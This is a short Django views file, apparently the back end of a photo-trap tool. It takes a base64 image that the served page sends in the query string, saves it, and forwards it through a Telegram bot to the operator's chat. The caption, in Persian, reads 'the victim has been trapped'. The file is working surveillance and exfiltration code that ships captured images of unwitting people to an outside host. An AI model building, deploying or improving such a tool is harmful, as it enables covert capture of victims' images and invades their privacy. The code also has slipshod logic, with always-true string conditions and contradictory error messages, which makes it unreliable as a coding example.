import asyncio

from django.http import HttpResponse
from django.shortcuts import render, redirect
import base64
from pictuer.config import *


def upload_image(request,id):

    if request.method == 'GET':
        return render(request, 'pictuer.html',{'id':id})
    else:
        return HttpResponse("Only GET requests are supported for this view.")


def process_image(request):
    if request.method == 'GET':

        try:
            if " Get photo from front end ":


                d = request.META.get('QUERY_STRING')

                id = d.split('-')[0]

                d = d.replace(f"{id}-data:image/png;base64,", "")
                decoded_data = base64.b64decode(d)

                with open("pictuer/photo/imageToSave.png", "wb") as fh:
                    fh.write(decoded_data)

            if " Send photo to bot ":
                status, response = asyncio.run(telegram(id))

                if " return ":
                    if status == 200 :
                        return HttpResponse("Image processed successfully")
                    else:
                        return HttpResponse("Image processed Unsuccessfully to send ")
        except:
            return HttpResponse("Image processed Unsuccessful")

    else:
        return HttpResponse("Only POST requests are supported for this view.")


async def telegram(id):
    bot = Client('bot', api_id=api_id, api_hash=api_hash, bot_token=bot_token, session_string=session_string)
    try:
        await bot.start()
        await bot.send_photo(int(id), "pictuer/photo/imageToSave.png", "قربانی به دام افتاد")
        await bot.stop()
    except:
        return 400, {}

    return 200, {}

